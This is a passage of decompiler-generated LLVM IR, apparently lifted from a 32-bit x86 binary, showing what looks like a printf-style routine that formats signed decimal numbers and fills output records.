dec_label_pc_804f8dd:                             ; preds = %dec_label_pc_804f8c7, %dec_label_pc_804f8d4
  %v0_804f8dd = phi i32 [ %v0_804f8b0, %dec_label_pc_804f8c7 ], [ %v2_804f8bc, %dec_label_pc_804f8d4 ]
  %v1_804f8dd = add i32 %v0_804f8dd, 1
  store i32 %v1_804f8dd, i32* %eax.global-to-local, align 4
  %v2_804f8e4 = inttoptr i32 %v1_804f8dd to i8*
  store i8 0, i8* %v2_804f8e4, align 1
  br i1 %v1_804f838, label %dec_label_pc_804f90a, label %dec_label_pc_804f8ef

dec_label_pc_804f8ef:                             ; preds = %dec_label_pc_804f8dd
  %v0_804f8ef = load i32, i32* %esi.global-to-local, align 4
  %v5_804f8f2 = icmp slt i32 %v0_804f8ef, -4
  br i1 %v5_804f8f2, label %dec_label_pc_804f917, label %dec_label_pc_804f8f4

dec_label_pc_804f8f4:                             ; preds = %dec_label_pc_804f8ef
  %v1_804f8f4 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804f8f6 = icmp slt i32 %v1_804f8f4, %v0_804f8ef
  br i1 %v7_804f8f6, label %dec_label_pc_804f917, label %dec_label_pc_804f8ff

dec_label_pc_804f8ff:                             ; preds = %dec_label_pc_804f8f4
  %v2_804f901 = sub i32 %v1_804f8f4, %v0_804f8ef
  store i32 %v2_804f901, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f91b

dec_label_pc_804f90a:                             ; preds = %dec_label_pc_804f8dd
  %v4_804f90a = zext i8 %stack_var_-207.1 to i32
  %v5_804f90a = load i32, i32* %ebx.global-to-local, align 4
  %v6_804f90a = and i32 %v5_804f90a, -256
  %v7_804f90a = or i32 %v6_804f90a, %v4_804f90a
  store i32 %v7_804f90a, i32* %ebx.global-to-local, align 4
  %v10_804f90e = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_804f90e, label %dec_label_pc_804f90a.dec_label_pc_804f91b_crit_edge, label %dec_label_pc_804f917

dec_label_pc_804f90a.dec_label_pc_804f91b_crit_edge: ; preds = %dec_label_pc_804f90a
  %v0_804f91b.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f91b

dec_label_pc_804f917:                             ; preds = %dec_label_pc_804f8ef, %dec_label_pc_804f8f4, %dec_label_pc_804f90a
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804f90a ], [ 103, %dec_label_pc_804f8f4 ], [ 103, %dec_label_pc_804f8ef ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f925

dec_label_pc_804f91b:                             ; preds = %dec_label_pc_804f90a.dec_label_pc_804f91b_crit_edge, %dec_label_pc_804f8ff
  %v0_804f91d = phi i32 [ %v0_804f91b.pre, %dec_label_pc_804f90a.dec_label_pc_804f91b_crit_edge ], [ %v0_804f8ef, %dec_label_pc_804f8ff ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804f90a.dec_label_pc_804f91b_crit_edge ], [ 102, %dec_label_pc_804f8ff ]
  %v2_804f91b = icmp slt i32 %v0_804f91d, 0
  store i32 %v0_804f91d, i32* %ebx.global-to-local, align 4
  %v1_804f91f = icmp eq i1 %v2_804f91b, false
  br i1 %v1_804f91f, label %dec_label_pc_804f925, label %dec_label_pc_804f921

dec_label_pc_804f921:                             ; preds = %dec_label_pc_804f91b
  %v0_804f921 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f921 = add i32 %v0_804f921, -1
  store i32 %v1_804f921, i32* %edx.global-to-local, align 4
  %v1_804f922 = inttoptr i32 %v1_804f921 to i8*
  store i8 48, i8* %v1_804f922, align 1
  %v0_804f95a.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f925

dec_label_pc_804f925:                             ; preds = %dec_label_pc_804f91b, %dec_label_pc_804f917, %dec_label_pc_804f921
  %v1_804f9b5 = phi i32 [ %v0_804f91d, %dec_label_pc_804f91b ], [ %v0_804f95a.pre, %dec_label_pc_804f921 ], [ 0, %dec_label_pc_804f917 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_804f91b ], [ %stack_var_-197.1, %dec_label_pc_804f921 ], [ %stack_var_-197.0, %dec_label_pc_804f917 ]
  %v2_804f925 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_804f925, i32* %eax.global-to-local, align 4
  %v0_804f934 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f934 = add i32 %v0_804f934, 1
  store i32 %v1_804f934, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_804f943 = inttoptr i32 %v0_804f934 to i8*
  %v2_804f943 = load i8, i8* %v1_804f943, align 1
  %v3_804f943 = zext i8 %v2_804f943 to i32
  %v5_804f943 = and i32 %v2_804f925, -256
  %v6_804f943 = or i32 %v3_804f943, %v5_804f943
  store i32 %v6_804f943, i32* %eax.global-to-local, align 4
  store i32 %v6_804f943, i32* %stack_var_-22, align 4
  %v2_804f958 = sub i32 %v1_804f8dd, %v1_804f934
  store i32 %v2_804f958, i32* %edx.global-to-local, align 4
  %v1_804f95a = icmp eq i32 %v1_804f9b5, 0
  %v2_804f95a = icmp slt i32 %v1_804f9b5, 0
  br i1 %v2_804f95a, label %dec_label_pc_804f9a9, label %dec_label_pc_804f95e

dec_label_pc_804f95e:                             ; preds = %dec_label_pc_804f925
  %v2_804f95e = sub i32 %v1_804f9b5, %v2_804f958
  %v8_804f95e = xor i32 %v2_804f958, %v1_804f9b5
  %v9_804f95e = xor i32 %v2_804f95e, %v1_804f9b5
  %v10_804f95e = and i32 %v9_804f95e, %v8_804f95e
  %v11_804f95e = icmp slt i32 %v10_804f95e, 0
  %v13_804f95e = icmp slt i32 %v2_804f95e, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_804f96c = icmp eq i1 %v13_804f95e, %v11_804f95e
  br i1 %v2_804f96c, label %dec_label_pc_804f96e, label %dec_label_pc_804f9a2

dec_label_pc_804f96e:                             ; preds = %dec_label_pc_804f95e
  store i32 %v2_804f95e, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_804f95e, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_804f983, label %dec_label_pc_804f99e

dec_label_pc_804f983:                             ; preds = %dec_label_pc_804f96e
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_804f99e

dec_label_pc_804f99e:                             ; preds = %dec_label_pc_804f96e, %dec_label_pc_804f983
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_804f983 ], [ %stack_var_-132, %dec_label_pc_804f96e ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f9be

dec_label_pc_804f9a2:                             ; preds = %dec_label_pc_804f95e
  %v4_804f9a4 = icmp eq i1 %v1_804f95a, false
  br i1 %v4_804f9a4, label %dec_label_pc_804f9af, label %dec_label_pc_804f9a6

dec_label_pc_804f9a6:                             ; preds = %dec_label_pc_804f9a2
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9a9

dec_label_pc_804f9a9:                             ; preds = %dec_label_pc_804f925, %dec_label_pc_804f9a6
  %v0_804f9f1112 = phi i32 [ %v1_804f9b5, %dec_label_pc_804f925 ], [ -1, %dec_label_pc_804f9a6 ]
  %v2_804f9a9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f9a9, i32* @ecx, align 4
  br label %dec_label_pc_804f9be

dec_label_pc_804f9af:                             ; preds = %dec_label_pc_804f9a2
  %v2_804f9b3 = add i32 %v1_804f934, %v1_804f9b5
  store i32 %v2_804f9b3, i32* %edi.global-to-local, align 4
  %v2_804f9b5 = sub i32 %v2_804f958, %v1_804f9b5
  store i32 %v2_804f9b5, i32* %edx.global-to-local, align 4
  %v2_804f9b7 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804f9b7, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9be

dec_label_pc_804f9be:                             ; preds = %dec_label_pc_804f9a9, %dec_label_pc_804f99e, %dec_label_pc_804f9af
  %v0_804f9f1111 = phi i32 [ %v0_804f9f1112, %dec_label_pc_804f9a9 ], [ -1, %dec_label_pc_804f99e ], [ -1, %dec_label_pc_804f9af ]
  %v0_804f9da = phi i32 [ %v2_804f9a9, %dec_label_pc_804f9a9 ], [ %storemerge28, %dec_label_pc_804f99e ], [ %v2_804f9b7, %dec_label_pc_804f9af ]
  %v0_804f9cb = phi i32 [ %v2_804f958, %dec_label_pc_804f9a9 ], [ 0, %dec_label_pc_804f99e ], [ %v2_804f9b5, %dec_label_pc_804f9af ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_804f9c5 = inttoptr i32 %v1_804f63b to i8*
  %v3_804f9c5 = load i8, i8* %v2_804f9c5, align 1
  %v4_804f9c5 = and i8 %v3_804f9c5, 16
  %v5_804f9c5 = icmp eq i8 %v4_804f9c5, 0
  %v1_804f9c9 = icmp eq i1 %v5_804f9c5, false
  br i1 %v1_804f9c9, label %dec_label_pc_804f9da, label %dec_label_pc_804f9cb

dec_label_pc_804f9cb:                             ; preds = %dec_label_pc_804f9be
  %v1_804f9cb = icmp eq i32 %v0_804f9cb, 0
  %v1_804f9cd = icmp eq i1 %v1_804f9cb, false
  br i1 %v1_804f9cd, label %dec_label_pc_804f9da, label %dec_label_pc_804f9cf

dec_label_pc_804f9cf:                             ; preds = %dec_label_pc_804f9cb
  br i1 %v12_804f833, label %dec_label_pc_804f9f1, label %dec_label_pc_804f9d6

dec_label_pc_804f9d6:                             ; preds = %dec_label_pc_804f9cf
  %v0_804f9d6 = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_804f9d6, 1
  br i1 %tmp189, label %dec_label_pc_804f9f1, label %dec_label_pc_804f9da

dec_label_pc_804f9da:                             ; preds = %dec_label_pc_804f9d6, %dec_label_pc_804f9cb, %dec_label_pc_804f9be
  %v1_804f9da = inttoptr i32 %v0_804f9da to i32*
  store i32 112, i32* %v1_804f9da, align 4
  %v0_804f9e0 = load i32, i32* @ecx, align 4
  %v1_804f9e0 = add i32 %v0_804f9e0, 4
  %v2_804f9e0 = inttoptr i32 %v1_804f9e0 to i32*
  store i32 1, i32* %v2_804f9e0, align 4
  %v0_804f9e7 = load i32, i32* @ecx, align 4
  %v1_804f9e7 = add i32 %v0_804f9e7, 8
  %v2_804f9e7 = inttoptr i32 %v1_804f9e7 to i32*
  store i32 ptrtoint (i32* @global_var_80517fc.133 to i32), i32* %v2_804f9e7, align 4
  %v0_804f9ee = load i32, i32* @ecx, align 4
  %v1_804f9ee = add i32 %v0_804f9ee, 12
  store i32 %v1_804f9ee, i32* @ecx, align 4
  %v0_804f9f1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9f1

dec_label_pc_804f9f1:                             ; preds = %dec_label_pc_804f9d6, %dec_label_pc_804f9cf, %dec_label_pc_804f9da
  %v0_804f9f8 = phi i32 [ %v0_804f9da, %dec_label_pc_804f9d6 ], [ %v0_804f9da, %dec_label_pc_804f9cf ], [ %v1_804f9ee, %dec_label_pc_804f9da ]
  %v0_804f9f1 = phi i32 [ %v0_804f9f1111, %dec_label_pc_804f9d6 ], [ %v0_804f9f1111, %dec_label_pc_804f9cf ], [ %v0_804f9f1.pre, %dec_label_pc_804f9da ]
  %v1_804f9f1 = add i32 %v0_804f9f1, 1
  %v8_804f9f1 = icmp eq i32 %v1_804f9f1, 0
  store i32 %v1_804f9f1, i32* %ebx.global-to-local, align 4
  br i1 %v8_804f9f1, label %dec_label_pc_804fa0b, label %dec_label_pc_804f9f4

dec_label_pc_804f9f4:                             ; preds = %dec_label_pc_804f9f1
  %v1_804f9f6 = sub i32 -1, %v0_804f9f1
  store i32 %v1_804f9f6, i32* %eax.global-to-local, align 4
  %v1_804f9f8 = inttoptr i32 %v0_804f9f8 to i32*
  store i32 176, i32* %v1_804f9f8, align 4
  %v0_804f9fe = load i32, i32* %eax.global-to-local, align 4
  %v1_804f9fe = load i32, i32* @ecx, align 4
  %v2_804f9fe = add i32 %v1_804f9fe, 4
  %v3_804f9fe = inttoptr i32 %v2_804f9fe to i32*
  store i32 %v0_804f9fe, i32* %v3_804f9fe, align 4
  %v0_804fa01 = load i32, i32* @ecx, align 4
  %v1_804fa01 = add i32 %v0_804fa01, 8
  %v2_804fa01 = inttoptr i32 %v1_804fa01 to i32*
  store i32 ptrtoint (i32* @global_var_80517ef.132 to i32), i32* %v2_804fa01, align 4
  %v0_804fa08 = load i32, i32* @ecx, align 4
  %v1_804fa08 = add i32 %v0_804fa08, 12
  store i32 %v1_804fa08, i32* @ecx, align 4
  br label %dec_label_pc_804fa0b

dec_label_pc_804fa0b:                             ; preds = %dec_label_pc_804f9f1, %dec_label_pc_804f9f4
  %v0_804fa0f = phi i32 [ %v0_804f9f8, %dec_label_pc_804f9f1 ], [ %v1_804fa08, %dec_label_pc_804f9f4 ]
  %v0_804fa0b = load i32, i32* %edx.global-to-local, align 4
  %v1_804fa0b = icmp eq i32 %v0_804fa0b, 0
  br i1 %v1_804fa0b, label %dec_label_pc_804fa1e, label %dec_label_pc_804fa0f

dec_label_pc_804fa0f:                             ; preds = %dec_label_pc_804fa0b
  %v1_804fa0f = inttoptr i32 %v0_804fa0f to i32*
  store i32 112, i32* %v1_804fa0f, align 4
  %v0_804fa15 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fa15 = load i32, i32* @ecx, align 4
  %v2_804fa15 = add i32 %v1_804fa15, 4
  %v3_804fa15 = inttoptr i32 %v2_804fa15 to i32*
  store i32 %v0_804fa15, i32* %v3_804fa15, align 4
  %v0_804fa18 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa18 = load i32, i32* @ecx, align 4
  %v2_804fa18 = add i32 %v1_804fa18, 8
  %v3_804fa18 = inttoptr i32 %v2_804fa18 to i32*
  store i32 %v0_804fa18, i32* %v3_804fa18, align 4
  %v0_804fa1b = load i32, i32* @ecx, align 4
  %v1_804fa1b = add i32 %v0_804fa1b, 12
  store i32 %v1_804fa1b, i32* @ecx, align 4
  br label %dec_label_pc_804fa1e

dec_label_pc_804fa1e:                             ; preds = %dec_label_pc_804fa0b, %dec_label_pc_804fa0f
  %v0_804fa3c = phi i32 [ %v0_804fa0f, %dec_label_pc_804fa0b ], [ %v1_804fa1b, %dec_label_pc_804fa0f ]
  br i1 %v1_804f838, label %dec_label_pc_804fa32, label %dec_label_pc_804fa25

dec_label_pc_804fa25:                             ; preds = %dec_label_pc_804fa1e
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_804fa2c = load i8, i8* %v2_804f9c5, align 1
  %v4_804fa2c = and i8 %v3_804fa2c, 16
  %v5_804fa2c = icmp eq i8 %v4_804fa2c, 0
  br i1 %v5_804fa2c, label %dec_label_pc_804fa4f, label %dec_label_pc_804fa32

dec_label_pc_804fa32:                             ; preds = %dec_label_pc_804fa25, %dec_label_pc_804fa1e
  %v0_804fa32 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fa34 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fa34 = sub i32 %v0_804fa32, %v1_804fa34
  store i32 %v2_804fa34, i32* %eax.global-to-local, align 4
  %v1_804fa36 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804fa36 = sub i32 %v2_804fa34, %v1_804fa36
  %v8_804fa36 = xor i32 %v1_804fa36, %v2_804fa34
  %v9_804fa36 = xor i32 %v2_804fa36, %v2_804fa34
  %v10_804fa36 = and i32 %v9_804fa36, %v8_804fa36
  %v11_804fa36 = icmp slt i32 %v10_804fa36, 0
  %v13_804fa36 = icmp slt i32 %v2_804fa36, 0
  %v2_804fa38 = icmp eq i1 %v13_804fa36, %v11_804fa36
  br i1 %v2_804fa38, label %dec_label_pc_804fa4f, label %dec_label_pc_804fa3a

dec_label_pc_804fa3a:                             ; preds = %dec_label_pc_804fa32
  %v2_804fa3a = sub i32 %v1_804fa36, %v2_804fa34
  store i32 %v2_804fa3a, i32* %ebp.global-to-local, align 4
  %v1_804fa3c = inttoptr i32 %v0_804fa3c to i32*
  store i32 176, i32* %v1_804fa3c, align 4
  %v0_804fa42 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fa42 = load i32, i32* @ecx, align 4
  %v2_804fa42 = add i32 %v1_804fa42, 4
  %v3_804fa42 = inttoptr i32 %v2_804fa42 to i32*
  store i32 %v0_804fa42, i32* %v3_804fa42, align 4
  %v0_804fa45 = load i32, i32* @ecx, align 4
  %v1_804fa45 = add i32 %v0_804fa45, 8
  %v2_804fa45 = inttoptr i32 %v1_804fa45 to i32*
  store i32 ptrtoint (i32* @global_var_80517ef.132 to i32), i32* %v2_804fa45, align 4
  %v0_804fa4c = load i32, i32* @ecx, align 4
  %v1_804fa4c = add i32 %v0_804fa4c, 12
  store i32 %v1_804fa4c, i32* @ecx, align 4
  br label %dec_label_pc_804fa4f

dec_label_pc_804fa4f:                             ; preds = %dec_label_pc_804fa32, %dec_label_pc_804fa25, %dec_label_pc_804fa3a
  %v1_804fad7121 = phi i32 [ %v0_804fa3c, %dec_label_pc_804fa32 ], [ %v0_804fa3c, %dec_label_pc_804fa25 ], [ %v1_804fa4c, %dec_label_pc_804fa3a ]
  %v12_804fa4f = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_804fa4f, label %dec_label_pc_804faca, label %dec_label_pc_804fa56

dec_label_pc_804fa56:                             ; preds = %dec_label_pc_804fa4f
  %v5_804fa56 = load i32, i32* %edx.global-to-local, align 4
  %v6_804fa56 = and i32 %v5_804fa56, -256
  %v7_804fa56 = or i32 %v6_804fa56, %stack_var_-42.0
  store i32 %v7_804fa56, i32* %edx.global-to-local, align 4
  %v0_804fa5d = load i32, i32* %esi.global-to-local, align 4
  %v2_804fa5d = icmp slt i32 %v0_804fa5d, 0
  %v1_804fa5f = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_804fa5d, label %dec_label_pc_804fa6e, label %dec_label_pc_804fa77

dec_label_pc_804fa6e:                             ; preds = %dec_label_pc_804fa56
  store i32 %v0_804fa5d, i32* %edx.global-to-local, align 4
  %v1_804fa70 = sub i32 0, %v0_804fa5d
  br label %dec_label_pc_804fa77

dec_label_pc_804fa77:                             ; preds = %dec_label_pc_804fa56, %dec_label_pc_804fa6e
  %storemerge27 = phi i32 [ %v1_804fa70, %dec_label_pc_804fa6e ], [ %v0_804fa5d, %dec_label_pc_804fa56 ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_804fa6e ], [ 43, %dec_label_pc_804fa56 ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_804fa7f = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_804fa7f, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa8b

dec_label_pc_804fa8b:                             ; preds = %dec_label_pc_804fa8b.backedge, %dec_label_pc_804fa77
  %v0_804fa96 = phi i32 [ %v0_804fa96.pre, %dec_label_pc_804fa8b.backedge ], [ %v2_804fa7f, %dec_label_pc_804fa77 ]
  %v0_804fa93 = phi i32 [ %v0_804fa93.pre, %dec_label_pc_804fa8b.backedge ], [ 2, %dec_label_pc_804fa77 ]
  %v0_804fa8b = phi i32 [ %v9_804fa94, %dec_label_pc_804fa8b.backedge ], [ %storemerge27, %dec_label_pc_804fa77 ]
  %v1_804fa92 = ashr i32 %v0_804fa8b, 31
  %v1_804fa93 = add i32 %v0_804fa93, 1
  store i32 %v1_804fa93, i32* %edi.global-to-local, align 4
  %v2_804fa94 = zext i32 %v0_804fa8b to i64
  %v4_804fa94 = zext i32 %v1_804fa92 to i64
  %v5_804fa94 = mul nuw i64 %v4_804fa94, 4294967296
  %v6_804fa94 = or i64 %v5_804fa94, %v2_804fa94
  %v8_804fa94 = sdiv i64 %v6_804fa94, 10
  %v9_804fa94 = trunc i64 %v8_804fa94 to i32
  %v10_804fa94 = srem i64 %v6_804fa94, 10
  %v1_804fa96 = add i32 %v0_804fa96, -1
  store i32 %v1_804fa96, i32* %ebx.global-to-local, align 4
  store i32 %v9_804fa94, i32* %esi.global-to-local, align 4
  %v3_804fa99 = and i32 %v9_804fa94, -256
  %v1_804fa9b = trunc i64 %v10_804fa94 to i8
  %v2_804fa9b = add i8 %v1_804fa9b, 48
  %v12_804fa9b = zext i8 %v2_804fa9b to i32
  %v15_804fa9b = or i32 %v12_804fa9b, %v3_804fa99
  store i32 %v15_804fa9b, i32* %eax.global-to-local, align 4
  %v3_804faa0 = inttoptr i32 %v1_804fa96 to i8*
  store i8 %v2_804fa9b, i8* %v3_804faa0, align 1
  store i32 %v9_804fa94, i32* %edx.global-to-local, align 4
  %v7_804faa4 = icmp sgt i32 %v1_804fa93, 3
  br i1 %v7_804faa4, label %dec_label_pc_804faa6, label %dec_label_pc_804fa8b.backedge

dec_label_pc_804faa6:                             ; preds = %dec_label_pc_804fa8b
  %v2_804faa6 = icmp eq i32 %v9_804fa94, 0
  %v1_804faa8 = icmp eq i1 %v2_804faa6, false
  br i1 %v1_804faa8, label %dec_label_pc_804fa8b.backedge, label %dec_label_pc_804faaa

dec_label_pc_804fa8b.backedge:                    ; preds = %dec_label_pc_804faa6, %dec_label_pc_804fa8b
  %v0_804fa93.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_804fa96.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa8b

dec_label_pc_804faaa:                             ; preds = %dec_label_pc_804faa6
  %v4_804faaa = zext i8 %storemerge9 to i32
  %v7_804faaa = or i32 %v3_804fa99, %v4_804faaa
  store i32 %v7_804faaa, i32* %edx.global-to-local, align 4
  %v0_804faae = load i32, i32* %ebx.global-to-local, align 4
  %v1_804faae = add i32 %v0_804faae, -2
  store i32 %v1_804faae, i32* %eax.global-to-local, align 4
  %v3_804fab1 = add i32 %v0_804faae, -1
  %v4_804fab1 = inttoptr i32 %v3_804fab1 to i8*
  store i8 %storemerge9, i8* %v4_804fab1, align 1
  %v5_804fab4 = load i32, i32* %edx.global-to-local, align 4
  %v6_804fab4 = and i32 %v5_804fab4, -256
  %v7_804fab4 = or i32 %v6_804fab4, %stack_var_-42.0
  store i32 %v7_804fab4, i32* %edx.global-to-local, align 4
  %v2_804fab8 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804fab8 = add i32 %v2_804fab8, -2
  %v4_804fab8 = inttoptr i32 %v3_804fab8 to i8*
  store i8 %v1_804fa5f, i8* %v4_804fab8, align 1
  %v0_804fabb = load i32, i32* @ecx, align 4
  %v1_804fabb = inttoptr i32 %v0_804fabb to i32*
  store i32 112, i32* %v1_804fabb, align 4
  %v0_804fac1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fac1 = load i32, i32* @ecx, align 4
  %v2_804fac1 = add i32 %v1_804fac1, 4
  %v3_804fac1 = inttoptr i32 %v2_804fac1 to i32*
  store i32 %v0_804fac1, i32* %v3_804fac1, align 4
  %v0_804fac4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fac4 = load i32, i32* @ecx, align 4
  %v2_804fac4 = add i32 %v1_804fac4, 8
  %v3_804fac4 = inttoptr i32 %v2_804fac4 to i32*
  store i32 %v0_804fac4, i32* %v3_804fac4, align 4
  %v0_804fac7 = load i32, i32* @ecx, align 4
  %v1_804fac7 = add i32 %v0_804fac7, 12
  store i32 %v1_804fac7, i32* @ecx, align 4
  br label %dec_label_pc_804faca

dec_label_pc_804faca:                             ; preds = %dec_label_pc_804fa4f, %dec_label_pc_804f6f9, %dec_label_pc_804faaa
  %v0_804fb49 = phi i32 [ %v1_804fad7121, %dec_label_pc_804fa4f ], [ %v2_804f701, %dec_label_pc_804f6f9 ], [ %v1_804fac7, %dec_label_pc_804faaa ]
  %v2_804faca = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804faca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804face

dec_label_pc_804face:                             ; preds = %dec_label_pc_804face, %dec_label_pc_804faca
  %v0_804face = phi i32 [ %v2_804faca, %dec_label_pc_804faca ], [ %v1_804fad0, %dec_label_pc_804face ]
  %stack_var_-216.0 = phi i32 [ %v3_804f5fb, %dec_label_pc_804faca ], [ %v5_804fad3, %dec_label_pc_804face ]
  %v1_804face = inttoptr i32 %v0_804face to i32*
  %v2_804face = load i32, i32* %v1_804face, align 4
  store i32 %v2_804face, i32* %ebx.global-to-local, align 4
  %v1_804fad0 = add i32 %v0_804face, 12
  store i32 %v1_804fad0, i32* %eax.global-to-local, align 4
  %v5_804fad3 = sub i32 %stack_var_-216.0, %v2_804face
  %v7_804fad7 = icmp ult i32 %v1_804fad0, %v0_804fb49
  br i1 %v7_804fad7, label %dec_label_pc_804face, label %dec_label_pc_804fadb

dec_label_pc_804fadb:                             ; preds = %dec_label_pc_804face
  store i32 %v0_804fb49, i32* %esi.global-to-local, align 4
  %v5_804faee = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_804fafe = icmp eq i1 %v5_804faee, false
  %v2_804fafe = zext i1 %v1_804fafe to i32
  store i32 %v2_804fafe, i32* %edx.global-to-local, align 4
  %v2_804fb01 = sub i32 %v5_804fad3, %v2_804fafe
  store i32 %v2_804fb01, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_804fb01, 1
  br i1 %tmp190, label %dec_label_pc_804fb4b, label %dec_label_pc_804fb0b

dec_label_pc_804fb0b:                             ; preds = %dec_label_pc_804fadb
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_804fb12 = inttoptr i32 %v1_804f63b to i8*
  %v3_804fb12 = load i8, i8* %v2_804fb12, align 1
  %v4_804fb12 = and i8 %v3_804fb12, 8
  %v5_804fb12 = icmp eq i8 %v4_804fb12, 0
  br i1 %v5_804fb12, label %dec_label_pc_804fb2d, label %dec_label_pc_804fb18

dec_label_pc_804fb18:                             ; preds = %dec_label_pc_804fb0b
  %v1_804fb18 = add i32 %v0_804fb49, 12
  store i32 %v1_804fb18, i32* %esi.global-to-local, align 4
  %v1_804fb1b = inttoptr i32 %v0_804fb49 to i32*
  store i32 160, i32* %v1_804fb1b, align 4
  %v1_804fb21 = load i32, i32* @ecx, align 4
  %v2_804fb21 = add i32 %v1_804fb21, 4
  %v3_804fb21 = inttoptr i32 %v2_804fb21 to i32*
  store i32 %v2_804fb01, i32* %v3_804fb21, align 4
  %v0_804fb24 = load i32, i32* @ecx, align 4
  %v1_804fb24 = add i32 %v0_804fb24, 8
  %v2_804fb24 = inttoptr i32 %v1_804fb24 to i32*
  store i32 ptrtoint (i32* @global_var_80517ef.132 to i32), i32* %v2_804fb24, align 4
  br label %dec_label_pc_804fb4b

dec_label_pc_804fb2d:                             ; preds = %dec_label_pc_804fb0b
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_804fb34 = add i32 %tmp156, 16
  %v2_804fb34 = inttoptr i32 %v1_804fb34 to i32*
  %v3_804fb34 = load i32, i32* %v2_804fb34, align 4
  %v9_804fb34 = icmp eq i32 %v3_804fb34, 48
  %v1_804fb38 = icmp eq i1 %v9_804fb34, false
  br i1 %v1_804fb38, label %dec_label_pc_804fb45, label %dec_label_pc_804fb3a

dec_label_pc_804fb3a:                             ; preds = %dec_label_pc_804fb2d
  %v3_804fb3a = load i32, i32* %stack_var_-152, align 4
  %v5_804fb3a = add i32 %v3_804fb3a, %v2_804fb01
  store i32 %v5_804fb3a, i32* %stack_var_-152, align 4
  br label %dec_label_pc_804fb49

dec_label_pc_804fb40:                             ; preds = %dec_label_pc_804fb51
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb78

dec_label_pc_804fb45:                             ; preds = %dec_label_pc_804fb2d
  br label %dec_label_pc_804fb49

dec_label_pc_804fb49:                             ; preds = %dec_label_pc_804fb3a, %dec_label_pc_804fb45
  store i32 %v0_804fb49, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fb4b

dec_label_pc_804fb4b:                             ; preds = %dec_label_pc_804fadb, %dec_label_pc_804fb18, %dec_label_pc_804fb49
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804fb4d = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804fb4d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb51

dec_label_pc_804fb51:                             ; preds = %dec_label_pc_804fb6f, %dec_label_pc_804fb4b
  call void @__pseudo_call(i32 %tmp156)
  %v1_804fb6a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fb6a = add i32 %v1_804fb6a, 4
  %v3_804fb6a = inttoptr i32 %v2_804fb6a to i32*
  %v4_804fb6a = load i32, i32* %v3_804fb6a, align 4
  %v15_804fb6a = icmp eq i32 %v2_804fb01, %v4_804fb6a
  %v1_804fb6d = icmp eq i1 %v15_804fb6a, false
  br i1 %v1_804fb6d, label %dec_label_pc_804fb40, label %dec_label_pc_804fb6f

dec_label_pc_804fb6f:                             ; preds = %dec_label_pc_804fb51
  %v1_804fb6f = add i32 %v1_804fb6a, 12
  store i32 %v1_804fb6f, i32* %ebx.global-to-local, align 4
  %v0_804fb72 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fb72 = add i32 %v0_804fb72, %v2_804fb01
  store i32 %v2_804fb72, i32* %edi.global-to-local, align 4
  %v1_804fb74 = load i32, i32* %esi.global-to-local, align 4
